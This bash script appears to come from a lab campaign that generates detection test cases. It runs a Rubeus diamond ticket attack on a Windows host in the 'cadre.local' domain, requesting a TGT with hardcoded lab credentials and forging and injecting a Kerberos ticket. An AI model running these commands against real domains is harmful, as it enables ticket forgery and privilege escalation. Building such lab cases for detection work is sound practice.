#!/usr/bin/env bash
# T012 — Diamond ticket (Rubeus diamond — Windows-only, staged on ws01)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T012-DIAMOND-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T012 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_rubeus

# Diamond requires TGT from legitimate user — use chief_command TGT then diamond
ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  'C:\Tools\cadre-attack\Rubeus.exe asktgt /user:chief_command /password:C0mm@nd_Ch1ef! /domain:cadre.local /dc:dc01.cadre.local /nowrap /ptt; C:\Tools\cadre-attack\Rubeus.exe diamond /ticket:current /enctype:aes /ptt /nowrap; klist'

cadre_export "${CASE_ID}" T012 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
